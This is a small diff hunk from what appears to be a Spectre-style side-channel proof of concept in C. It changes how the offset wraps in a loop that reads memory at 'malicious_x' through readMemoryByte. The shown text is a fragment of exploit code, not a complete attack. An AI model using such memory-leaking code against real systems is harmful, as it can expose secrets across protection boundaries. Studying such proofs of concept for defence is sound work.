@@ -178,7 +178,7 @@ int main(int argc,
   //printf("Reading %d bytes:\n", len);
   while (1) {
     offset += 1;
-    if (offset >= 40) offset = 1;
+    if (offset >= 40) offset = 0;
     //printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
     readMemoryByte(malicious_x+offset, value, score, results);
 
